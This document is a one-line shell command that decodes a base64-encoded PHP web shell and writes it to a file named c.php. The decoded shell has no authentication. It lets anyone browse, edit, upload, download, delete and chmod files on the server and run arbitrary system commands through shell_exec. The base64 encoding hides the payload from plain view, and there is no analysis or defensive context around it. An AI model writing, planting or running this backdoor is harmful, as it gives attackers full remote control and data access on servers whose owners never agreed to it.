echo PD9waHAKJGN1cnJlbnREaXJlY3RvcnkgPSByZWFscGF0aCgnLicpOwoKaWYoaXNzZXQoJF9HRVRbJ3BhdGgnXSkpewogICAgJHJlcXVlc3RlZFBhdGggPSByZWFscGF0aCgkX0dFVFsncGF0aCddKTsKICAgIGlmKCRyZXF1ZXN0ZWRQYXRoICYmIGlzX2RpcigkcmVxdWVzdGVkUGF0aCkpewogICAgICAgICRjdXJyZW50RGlyZWN0b3J5ID0gJHJlcXVlc3RlZFBhdGg7CiAgICB9Cn0KCmlmIChpc3NldCgkX0dFVFsnZWRpdEZpbGUnXSkpIHsKICAgICRlZGl0RmlsZSA9ICRfR0VUWydlZGl0RmlsZSddOwogICAgaWYgKGZpbGVfZXhpc3RzKCRlZGl0RmlsZSkgJiYgaXNfcmVhZGFibGUoJGVkaXRGaWxlKSkgewogICAgICAgICRmaWxlQ29udGVudCA9IGZpbGVfZ2V0X2NvbnRlbnRzKCRlZGl0RmlsZSk7CiAgICB9IGVsc2UgewogICAgICAgIGVjaG8gIkVycm9yOiBVbmFibGUgdG8gcmVhZCB0aGUgZmlsZS4iOwogICAgICAgIGV4aXQ7CiAgICB9Cn0KCmlmIChpc3NldCgkX1BPU1RbJ2NvbnRlbnQnXSkgJiYgaXNzZXQoJF9QT1NUWydlZGl0RmlsZSddKSkgewogICAgJGNvbnRlbnQgPSBodG1sc3BlY2lhbGNoYXJzX2RlY29kZSgkX1BPU1RbJ2NvbnRlbnQnXSk7CiAgICAkZmlsZVBhdGggPSAkX1BPU1RbJ2VkaXRGaWxlJ107CiAgICBmaWxlX3B1dF9jb250ZW50cygkZmlsZVBhdGgsICRjb250ZW50KTsKICAgIGVjaG8gIkZpbGUgaGFzIGJlZW4gc2F2ZWQuIjsKfQoKaWYoaXNzZXQoJF9QT1NUWydjaGFuZ2VQZXJtaXNzaW9uJ10pICYmIGlzc2V0KCRfUE9TVFsnbmV3UGVybWlzc2lvbiddKSkgewogICAgJGZpbGVQYXRoID0gJF9QT1NUWydjaGFuZ2VQZXJtaXNzaW9uJ107CiAgICAkbmV3UGVybWlzc2lvbiA9ICRfUE9TVFsnbmV3UGVybWlzc2lvbiddOwoKICAgIC8vIFZhbGlkYXRlIHRoZSBuZXcgcGVybWlzc2lvbiBmb3JtYXQKICAgIGlmIChwcmVnX21hdGNoKCcvXlswLTddezN9JC8nLCAkbmV3UGVybWlzc2lvbikpIHsKICAgICAgICAvLyBDaGFuZ2UgZmlsZSBwZXJtaXNzaW9ucyB1c2luZyBjaG1vZAogICAgICAgIGlmIChjaG1vZCgkZmlsZVBhdGgsIG9jdGRlYygkbmV3UGVybWlzc2lvbikpKSB7CiAgICAgICAgICAgIGVjaG8gIkZpbGUgcGVybWlzc2lvbnMgY2hhbmdlZCBzdWNjZXNzZnVsbHkuIjsKICAgICAgICB9IGVsc2UgewogICAgICAgICAgICBlY2hvICJFcnJvcjogVW5hYmxlIHRvIGNoYW5nZSBmaWxlIHBlcm1pc3Npb25zLiI7CiAgICAgICAgfQogICAgfSBlbHNlIHsKICAgICAgICBlY2hvICJFcnJvcjogSW52YWxpZCBwZXJtaXNzaW9uIGZvcm1hdC4gVXNlIGEgdGhyZWUtZGlnaXQgb2N0YWwgbnVtYmVyIChlLmcuLCA3NTUpLiI7CiAgICB9Cn0KCgppZihpc3NldCgkX0dFVFsnZGVsZXRlRmlsZSddKSl7CiAgICAkZmlsZVBhdGggPSByZWFscGF0aCgkX0dFVFsnZGVsZXRlRmlsZSddKTsKICAgIGlmKCRmaWxlUGF0aCAmJiBpc19maWxlKCRmaWxlUGF0aCkpewogICAgICAgIHVubGluaygkZmlsZVBhdGgpOwogICAgfQp9CgoKaWYoaXNzZXQoJF9HRVRbJ2Rvd25sb2FkRmlsZSddKSl7CiAgICAkZmlsZVBhdGggPSAkX0dFVFsnZG93bmxvYWRGaWxlJ107CiAgICBoZWFkZXIoJ0NvbnRlbnQtVHlwZTogYXBwbGljYXRpb24vb2N0ZXQtc3RyZWFtJyk7CiAgICBoZWFkZXIoJ0NvbnRlbnQtRGlzcG9zaXRpb246IGF0dGFjaG1lbnQ7IGZpbGVuYW1lPSInLmJhc2VuYW1lKCRmaWxlUGF0aCkuJyInKTsKICAgIHJlYWRmaWxlKCRmaWxlUGF0aCk7CiAgICBleGl0Owp9CgppZihpc3NldCgkX0ZJTEVTWyd1cGxvYWRGaWxlJ10pKXsKICAgICR1cGxvYWREaXIgPSAkY3VycmVudERpcmVjdG9yeTsKICAgICRmaWxlQ291bnQgPSBjb3VudCgkX0ZJTEVTWyd1cGxvYWRGaWxlJ11bJ25hbWUnXSk7CiAgICAKICAgIGZvcigkaSA9IDA7ICRpIDwgJGZpbGVDb3VudDsgJGkrKykgewogICAgICAgICR1cGxvYWRGaWxlID0gJHVwbG9hZERpciAuICcvJyAuIGJhc2VuYW1lKCRfRklMRVNbJ3VwbG9hZEZpbGUnXVsnbmFtZSddWyRpXSk7CiAgICAgICAgbW92ZV91cGxvYWRlZF9maWxlKCRfRklMRVNbJ3VwbG9hZEZpbGUnXVsndG1wX25hbWUnXVskaV0sICR1cGxvYWRGaWxlKTsKICAgIH0KfQppZihpc3NldCgkX0dFVFsncmVtb3ZlRm9sZGVyJ10pKXsKICAgICRmb2xkZXJQYXRoID0gcmVhbHBhdGgoJF9HRVRbJ3JlbW92ZUZvbGRlciddKTsKICAgIGlmKCRmb2xkZXJQYXRoICYmIGlzX2RpcigkZm9sZGVyUGF0aCkpewogICAgICAgIC8vIFJlY3Vyc2l2ZSBmdW5jdGlvbiB0byBkZWxldGUgZm9sZGVyIGFuZCBpdHMgY29udGVudHMKICAgICAgICBmdW5jdGlvbiBkZWxldGVGb2xkZXIoJGZvbGRlclBhdGgpewogICAgICAgICAgICBmb3JlYWNoIChnbG9iKCRmb2xkZXJQYXRoIC4gJy8qJykgYXMgJGZpbGUpIHsKICAgICAgICAgICAgICAgIGlmIChpc19kaXIoJGZpbGUpKSB7CiAgICAgICAgICAgICAgICAgICAgZGVsZXRlRm9sZGVyKCRmaWxlKTsKICAgICAgICAgICAgICAgIH0gZWxzZSB7CiAgICAgICAgICAgICAgICAgICAgdW5saW5rKCRmaWxlKTsKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgfQogICAgICAgICAgICBybWRpcigkZm9sZGVyUGF0aCk7CiAgICAgICAgfQogICAgICAgIGRlbGV0ZUZvbGRlcigkZm9sZGVyUGF0aCk7CiAgICB9Cn0KCgppZihpc3NldCgkX0dFVFsncmVuYW1lRm9sZGVyJ10pKXsKICAgICRmb2xkZXJQYXRoID0gcmVhbHBhdGgoJF9HRVRbJ3JlbmFtZUZvbGRlciddKTsKICAgIGlmKCRmb2xkZXJQYXRoICYmIGlzX2RpcigkZm9sZGVyUGF0aCkpewogICAgICAgIC8vIEhhbmRsZSB0aGUgZm9ybSBzdWJtaXNzaW9uCiAgICAgICAgaWYoaXNzZXQoJF9QT1NUWyduZXdGb2xkZXJOYW1lJ10pKXsKICAgICAgICAgICAgJG5ld0ZvbGRlck5hbWUgPSAkX1BPU1RbJ25ld0ZvbGRlck5hbWUnXTsKICAgICAgICAgICAgJG5ld0ZvbGRlclBhdGggPSBkaXJuYW1lKCRmb2xkZXJQYXRoKSAuICcvJyAuICRuZXdGb2xkZXJOYW1lOwoKICAgICAgICAgICAgaWYocmVuYW1lKCRmb2xkZXJQYXRoLCAkbmV3Rm9sZGVyUGF0aCkpewogICAgICAgICAgICAgICAgZWNobyAiRm9sZGVyIHJlbmFtZWQgc3VjY2Vzc2Z1bGx5LiI7CiAgICAgICAgICAgIH0gZWxzZSB7CiAgICAgICAgICAgICAgICBlY2hvICJFcnJvcjogVW5hYmxlIHRvIHJlbmFtZSBmb2xkZXIuIjsKICAgICAgICAgICAgfQogICAgICAgIH0gZWxzZSB7CiAgICAgICAgICAgIC8vIERpc3BsYXkgYSBmb3JtIHRvIGlucHV0IHRoZSBuZXcgZm9sZGVyIG5hbWUKICAgICAgICAgICAgZWNobyAnPGZvcm0gYWN0aW9uPSIiIG1ldGhvZD0icG9zdCI+CiAgICAgICAgICAgICAgICAgICAgPGlucHV0IHR5cGU9InRleHQiIG5hbWU9Im5ld0ZvbGRlck5hbWUiIHBsYWNlaG9sZGVyPSJFbnRlciBuZXcgZm9sZGVyIG5hbWUiPgogICAgICAgICAgICAgICAgICAgIDxpbnB1dCB0eXBlPSJzdWJtaXQiIHZhbHVlPSJSZW5hbWUiPgogICAgICAgICAgICAgICAgICA8L2Zvcm0+JzsKICAgICAgICB9CiAgICB9Cn0KCmlmKGlzc2V0KCRfUE9TVFsnbmV3Rm9sZGVyTmFtZSddKSl7CiAgICAkbmV3Rm9sZGVyTmFtZSA9ICRfUE9TVFsnbmV3Rm9sZGVyTmFtZSddOwogICAgJG5ld0ZvbGRlclBhdGggPSAkY3VycmVudERpcmVjdG9yeSAuICcvJyAuICRuZXdGb2xkZXJOYW1lOwoKICAgIGlmKCFmaWxlX2V4aXN0cygkbmV3Rm9sZGVyUGF0aCkgJiYgIWlzX2RpcigkbmV3Rm9sZGVyUGF0aCkpewogICAgICAgIGlmKG1rZGlyKCRuZXdGb2xkZXJQYXRoLCAwNzc3LCB0cnVlKSl7CiAgICAgICAgICAgIGVjaG8gIkZvbGRlciBjcmVhdGVkIHN1Y2Nlc3NmdWxseS4iOwogICAgICAgIH0gZWxzZSB7CiAgICAgICAgICAgIGVjaG8gIkVycm9yOiBVbmFibGUgdG8gY3JlYXRlIGZvbGRlci4iOwogICAgICAgIH0KICAgIH0gZWxzZSB7CiAgICAgICAgZWNobyAiRXJyb3I6IEZvbGRlciBhbHJlYWR5IGV4aXN0cy4iOwogICAgfQp9CgppZihpc3NldCgkX0dFVFsncmVuYW1lRmlsZSddKSl7CiAgICAkZmlsZVBhdGggPSByZWFscGF0aCgkX0dFVFsncmVuYW1lRmlsZSddKTsKICAgIGlmKCRmaWxlUGF0aCAmJiBpc19maWxlKCRmaWxlUGF0aCkpewogICAgICAgIC8vIEhhbmRsZSB0aGUgZm9ybSBzdWJtaXNzaW9uCiAgICAgICAgaWYoaXNzZXQoJF9QT1NUWyduZXdGaWxlTmFtZSddKSl7CiAgICAgICAgICAgICRuZXdGaWxlTmFtZSA9ICRfUE9TVFsnbmV3RmlsZU5hbWUnXTsKICAgICAgICAgICAgJG5ld0ZpbGVQYXRoID0gZGlybmFtZSgkZmlsZVBhdGgpIC4gJy8nIC4gJG5ld0ZpbGVOYW1lOwoKICAgICAgICAgICAgaWYocmVuYW1lKCRmaWxlUGF0aCwgJG5ld0ZpbGVQYXRoKSl7CiAgICAgICAgICAgICAgICBlY2hvICJGaWxlIHJlbmFtZWQgc3VjY2Vzc2Z1bGx5LiI7CiAgICAgICAgICAgIH0gZWxzZSB7CiAgICAgICAgICAgICAgICBlY2hvICJFcnJvcjogVW5hYmxlIHRvIHJlbmFtZSBmaWxlLiI7CiAgICAgICAgICAgIH0KICAgICAgICB9IGVsc2UgewogICAgICAgICAgICAvLyBEaXNwbGF5IGEgZm9ybSB0byBpbnB1dCB0aGUgbmV3IGZpbGUgbmFtZQogICAgICAgICAgICBlY2hvICc8Zm9ybSBhY3Rpb249IiIgbWV0aG9kPSJwb3N0Ij4KICAgICAgICAgICAgICAgICAgICA8aW5wdXQgdHlwZT0idGV4dCIgbmFtZT0ibmV3RmlsZU5hbWUiIHBsYWNlaG9sZGVyPSJFbnRlciBuZXcgZmlsZSBuYW1lIj4KICAgICAgICAgICAgICAgICAgICA8aW5wdXQgdHlwZT0ic3VibWl0IiB2YWx1ZT0iUmVuYW1lIj4KICAgICAgICAgICAgICAgICAgPC9mb3JtPic7CiAgICAgICAgfQogICAgfQp9CgoKaWYoaXNzZXQoJF9QT1NUWydjbWQnXSkpewogICAgJG91dHB1dCA9IHNoZWxsX2V4ZWMoJF9QT1NUWydjbWQnXSk7Cn0KCiRmaWxlcyA9IHNjYW5kaXIoJGN1cnJlbnREaXJlY3RvcnkpOwo/Pgo8P3BocCBpZihpc3NldCgkX0dFVFsnY2hhbmdlUGVybWlzc2lvbiddKSk6ID8+CiAgICA8Zm9ybSBhY3Rpb249IiIgbWV0aG9kPSJwb3N0Ij4KICAgICAgICA8bGFiZWwgZm9yPSJuZXdQZXJtaXNzaW9uIj48L2xhYmVsPgogICAgICAgIDxpbnB1dCB0eXBlPSJ0ZXh0IiBuYW1lPSJuZXdQZXJtaXNzaW9uIiBwbGFjZWhvbGRlcj0iZS5nLiwgNzU1IiByZXF1aXJlZD4KICAgICAgICA8aW5wdXQgdHlwZT0iaGlkZGVuIiBuYW1lPSJjaGFuZ2VQZXJtaXNzaW9uIiB2YWx1ZT0iPD9waHAgZWNobyAkX0dFVFsnY2hhbmdlUGVybWlzc2lvbiddOyA/PiI+CiAgICAgICAgPGlucHV0IHR5cGU9InN1Ym1pdCIgdmFsdWU9IkNoYW5nZSBQZXJtaXNzaW9ucyI+CiAgICA8L2Zvcm0+Cjw/cGhwIGVuZGlmOyA/PgoKCjw/cGhwIGlmKGlzc2V0KCRfR0VUWydlZGl0RmlsZSddKSk6ID8+CiAgICAgICAgPGgzPkVkaXQgRmlsZTo8L2gzPgogICAgICAgIDxmb3JtIGFjdGlvbj0iIiBtZXRob2Q9InBvc3QiPgogICAgICAgICAgICA8dGV4dGFyZWEgbmFtZT0iY29udGVudCIgcm93cz0iMzAiIGNvbHM9IjE1MCI+PD9waHAgZWNobyBodG1sc3BlY2lhbGNoYXJzKCRmaWxlQ29udGVudCk7ID8+PC90ZXh0YXJlYT48YnI+CiAgICAgICAgICAgIDxpbnB1dCB0eXBlPSJoaWRkZW4iIG5hbWU9ImVkaXRGaWxlIiB2YWx1ZT0iPD9waHAgZWNobyAkZWRpdEZpbGU7ID8+Ij4KICAgICAgICAgICAgPGlucHV0IHR5cGU9InN1Ym1pdCIgdmFsdWU9IlNhdmUiPgogICAgICAgIDwvZm9ybT4KICAgIDw/cGhwIGVuZGlmOyA/PgoKPGZvcm0gYWN0aW9uPSIiIG1ldGhvZD0icG9zdCI+CiAgICA8aW5wdXQgdHlwZT0idGV4dCIgbmFtZT0ibmV3Rm9sZGVyTmFtZSIgcGxhY2Vob2xkZXI9IkVudGVyIG5ldyBmb2xkZXIgbmFtZSI+CiAgICA8aW5wdXQgdHlwZT0ic3VibWl0IiB2YWx1ZT0iQ3JlYXRlIEZvbGRlciI+CjwvZm9ybT4KCjxodG1sPgogCjxib2R5PgogICAgIDxzdHlsZT4KICAgICAgICBib2R5IHsKICAgICAgICAgICAgYmFja2dyb3VuZC1pbWFnZTogdXJsKCdodHRwczovL2Nkbi5jeWJlcnB1bmsucnMvd3AtY29udGVudC91cGxvYWRzLzIwMTgvMDgva2FsaTEuanBnJyk7CiAgICAgICAgICAgIGJhY2tncm91bmQtc2l6ZTogY292ZXI7CiAgICAgICAgICAgIGJhY2tncm91bmQtYXR0YWNobWVudDogZml4ZWQ7IC8qIE1lbmphZGlrYW4gYmFja2dyb3VuZCB0ZXRhcCBzYWF0IHNjcm9sbCAqLwogICAgICAgIH0KIDwvc3R5bGU+CiAgICA8Zm9ybSBhY3Rpb249IiIgbWV0aG9kPSJwb3N0Ij4KICAgICAgICA8aW5wdXQgdHlwZT0idGV4dCIgbmFtZT0iY21kIiBwbGFjZWhvbGRlcj0iRW50ZXIgY29tbWFuZCI+CiAgICAgICAgPGlucHV0IHR5cGU9InN1Ym1pdCIgdmFsdWU9IlJ1biI+CiAgICA8L2Zvcm0+CiAgICA8P3BocCBpZihpc3NldCgkb3V0cHV0KSk6ID8+CiAgPGZvbnQgY29sb3IgPSJyZWQiPiAgICAgCiAgPHByZT48P3BocCBlY2hvICRvdXRwdXQ7ID8+PC9wcmU+CiAgPC9mb250PgogICAgPD9waHAgZW5kaWY7ID8+CiAgICAKPGgzIHN0eWxlPSJjb2xvcjogcmVkOyI+CiAgICA8Zm9ybSBhY3Rpb249IiIgbWV0aG9kPSJwb3N0IiBlbmN0eXBlPSJtdWx0aXBhcnQvZm9ybS1kYXRhIj4KICAgIDxpbnB1dCB0eXBlPSJmaWxlIiBuYW1lPSJ1cGxvYWRGaWxlW10iIG11bHRpcGxlIHJlcXVpcmVkPgogICAgPGlucHV0IHR5cGU9InN1Ym1pdCIgdmFsdWU9IlVwbG9hZCI+CjwvZm9ybT4KPC9oMz4KICAgICA8Zm9udCBjb2xvciA9ImdyZWVuIj4gPGgzPkRpcjogPD9waHAgZWNobyAkY3VycmVudERpcmVjdG9yeTsgPz4gCgkgICAgICA8YSBocmVmPSI/cGF0aD08P3BocCBlY2hvIHJlYWxwYXRoKCcuJyk7ID8+IiBzdHlsZT0iY29sb3I6IHJlZDsiPkhvbWU8L2E+CiA8dWw+CiAgICAgCiAgICAgICA8Zm9udCBjb2xvciA9ImdyZWVuIj4gCiAgIDxhIGhyZWY9Ij9wYXRoPTw/cGhwIGVjaG8gZGlybmFtZSgkY3VycmVudERpcmVjdG9yeSk7ID8+IiBzdHlsZT0iY29sb3I6IHJlZDsiPuKGqTwvYT4KICAgIDw/cGhwCiAgICBmb3JlYWNoICgkZmlsZXMgYXMgJGZpbGUpIHsKICAgICAgICBpZiAoJGZpbGUgIT0gIi4iICYmICRmaWxlICE9ICIuLiIgJiYgaXNfZGlyKCRjdXJyZW50RGlyZWN0b3J5IC4gJy8nIC4gJGZpbGUpKSB7CiAgICAgICAgICAgIAogICAgICAgICAgIGVjaG8gJzxsaT48YSBocmVmPSI/cGF0aD0nIC4gJGN1cnJlbnREaXJlY3RvcnkgLiAnLycgLiAkZmlsZSAuICciIHN0eWxlPSJjb2xvcjogZ3JlZW47bWFyZ2luLWJvdHRvbTogMTNweDsiPicgLiAkZmlsZSAuICc8L2E+PC9saT4nOwogICAgICAgICAgICAgICAgZWNobyAnPGEgaHJlZj0iP3JlbmFtZUZvbGRlcj0nIC4gJGN1cnJlbnREaXJlY3RvcnkgLiAnLycgLiAkZmlsZSAuICciIHN0eWxlPSJjb2xvcjogI0ZGMDAwMDsgbWFyZ2luLWJvdHRvbTogMTBweDsiPiBSZW5hbWUgfHwgPC9hPic7CiAgICAgICAgICAgICAgICBlY2hvICc8YSBocmVmPSI/cmVtb3ZlRm9sZGVyPScgLiAkY3VycmVudERpcmVjdG9yeSAuICcvJyAuICRmaWxlIC4gJyIgc3R5bGU9ImNvbG9yOiAjRkYwMDAwOyBtYXJnaW4tYm90dG9tOiAxMHB4OyI+IFJlbW92ZSA8L2E+JzsKICAgICAgICAgICAgICAgIGVjaG8gJzwvZGl2Pic7CiAgICAgICAgfQogICAgfQoKCmZvcmVhY2ggKCRmaWxlcyBhcyAkZmlsZSkgewogICAgJGZpbGVQYXRoID0gJGN1cnJlbnREaXJlY3RvcnkgLiAnLycgLiAkZmlsZTsKICAgIGlmICgkZmlsZSAhPSAiLiIgJiYgJGZpbGUgIT0gIi4uIiAmJiBpc19maWxlKCRmaWxlUGF0aCkpIHsKICAgICAgICBlY2hvICc8bGk+JzsKICAgICAgICBlY2hvICc8c3BhbiBzdHlsZT0ibWFyZ2luLWJvdHRvbTogMTBweDsiPicgLiAkZmlsZSAuICc8L3NwYW4+JzsKICAgICAgICBlY2hvICc8ZGl2Pic7CiAgICAgICAgCiAgICAgICAgLy8gSW5mb3JtYXNpIHRhbmdnYWwgdGVyYWtoaXIgZWRpdCBkYW4gaXppbiBoYW55YSB1bnR1ayBmaWxlCiAgICAgICAgZWNobyAnPHAgc3R5bGU9ImNvbG9yOiAjODg4OyBmb250LXNpemU6IDEycHg7IG1hcmdpbi1ib3R0b206IDVweDsiPic7CiAgICAgICAgZWNobyAnTGFzdCBtb2RpZmllZDogJyAuIGRhdGUoIkYgZCBZIEg6aTpzLiIsIGZpbGVtdGltZSgkZmlsZVBhdGgpKTsKICAgICAgICBlY2hvICc8L3A+JzsKICAgICAgICBlY2hvICc8cCBzdHlsZT0iY29sb3I6ICM4ODg7IGZvbnQtc2l6ZTogMTJweDsgbWFyZ2luLWJvdHRvbTogNXB4OyI+JzsKICAgICAgICBlY2hvICdQZXJtaXNzaW9uczogJyAuIHN1YnN0cihzcHJpbnRmKCclbycsIGZpbGVwZXJtcygkZmlsZVBhdGgpKSwgLTQpOwogICAgICAgIGVjaG8gJzwvcD4nOwoKICAgICAgICAvLyBNZW5hbXBpbGthbiBpbmZvcm1hc2kgdWt1cmFuIGZpbGUgKGRhbGFtIEtCKQogICAgICAgICRmaWxlU2l6ZSA9IGZpbGVzaXplKCRmaWxlUGF0aCkgLyAxMDI0OyAvLyBLb252ZXJzaSBkYXJpIGJ5dGUga2UgS0IKICAgICAgICBlY2hvICc8cCBzdHlsZT0iY29sb3I6ICM4ODg7IGZvbnQtc2l6ZTogMTJweDsgbWFyZ2luLWJvdHRvbTogNXB4OyI+JzsKICAgICAgICBlY2hvICdGaWxlIHNpemU6ICcgLiByb3VuZCgkZmlsZVNpemUsIDIpIC4gJyBLQic7CiAgICAgICAgZWNobyAnPC9wPic7CmVjaG8gJzxhIGhyZWY9Ij9lZGl0RmlsZT0nIC4gJGN1cnJlbnREaXJlY3RvcnkgLiAnLycgLiAkZmlsZSAuICciIHN0eWxlPSJjb2xvcjogI0ZGMDAwMDsgbWFyZ2luLWJvdHRvbTogMTBweDsiPkVkaXQgPC9hPic7CmVjaG8gJzxhIGhyZWY9Ij9yZW5hbWVGaWxlPScgLiAkY3VycmVudERpcmVjdG9yeSAuICcvJyAuICRmaWxlIC4gJyIgc3R5bGU9ImNvbG9yOiAjRkYwMDAwOyBtYXJnaW4tYm90dG9tOiAxMHB4OyI+fHwgUmVuYW1lIEZpbGUgPC9hPic7CmVjaG8gJzxhIGhyZWY9Ij9kZWxldGVGaWxlPScgLiAkY3VycmVudERpcmVjdG9yeSAuICcvJyAuICRmaWxlIC4gJyIgc3R5bGU9ImNvbG9yOiAjRkYwMDAwOyBtYXJnaW4tYm90dG9tOiAxMHB4OyI+fHwgRGVsZXRlIHx8PC9hPic7CmVjaG8gJzxhIGhyZWY9Ij9kb3dubG9hZEZpbGU9JyAuICRjdXJyZW50RGlyZWN0b3J5IC4gJy8nIC4gJGZpbGUgLiAnIiBzdHlsZT0iY29sb3I6ICNGRjAwMDA7IG1hcmdpbi1ib3R0b206IDEwcHg7Ij4gRG93bmxvYWQgfHw8L2E+JzsKZWNobyAnPGEgaHJlZj0iP2NoYW5nZVBlcm1pc3Npb249JyAuICRjdXJyZW50RGlyZWN0b3J5IC4gJy8nIC4gJGZpbGUgLiAnIiBzdHlsZT0iY29sb3I6ICNGRjAwMDA7IG1hcmdpbi1ib3R0b206IDEwcHg7Ij4gQ2htb2QgPC9hPic7CiAgICAgICAgZWNobyAnPC9kaXY+JzsKICAgICAgICBlY2hvICc8L2xpPic7CiAgICB9Cn0KCgoKICAgID8+CiAgICA8L2ZvbnQ+CjwvdWw+CgoKCjw/cGhwCmlmKGlzc2V0KCRfR0VUWydlZGl0RmlsZSddKSkgewogICAgJGVkaXRGaWxlID0gJF9HRVRbJ2VkaXRGaWxlJ107CiAgICBpZihmaWxlX2V4aXN0cygkZWRpdEZpbGUpICYmIGlzX3JlYWRhYmxlKCRlZGl0RmlsZSkpIHsKICAgICAgICAkZmlsZUNvbnRlbnQgPSBmaWxlX2dldF9jb250ZW50cygkZWRpdEZpbGUpOwogICAgfSBlbHNlIHsKICAgICAgICBlY2hvICJFcnJvcjogVW5hYmxlIHRvIHJlYWQgdGhlIGZpbGUuIjsKICAgICAgICBleGl0OwogICAgfQp9CgppZihpc3NldCgkX1BPU1RbJ2NvbnRlbnQnXSkgJiYgaXNzZXQoJF9QT1NUWydlZGl0RmlsZSddKSkgewogICAgJGNvbnRlbnQgPSBodG1sc3BlY2lhbGNoYXJzX2RlY29kZSgkX1BPU1RbJ2NvbnRlbnQnXSk7CiAgICAkZmlsZVBhdGggPSAkX1BPU1RbJ2VkaXRGaWxlJ107CiAgICBmaWxlX3B1dF9jb250ZW50cygkZmlsZVBhdGgsICRjb250ZW50KTsKICAgIGVjaG8gIkZpbGUgaGFzIGJlZW4gc2F2ZWQuIjsKfQo/PgoKPC9mb250Pgo8L2JvZHk+CjwvaHRtbD4= | base64 -d | tee c.php
